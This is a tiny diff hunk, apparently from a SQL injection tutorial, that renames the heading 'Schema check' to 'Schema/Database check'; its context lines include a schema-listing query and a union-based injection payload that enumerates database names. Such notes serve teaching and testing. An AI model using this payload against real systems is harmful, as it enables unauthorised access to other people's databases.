@@ -5,7 +5,7 @@
 
       mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 
-#### Step 1: Schema check
+#### Step 1: Schema/Database check
 
      cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 
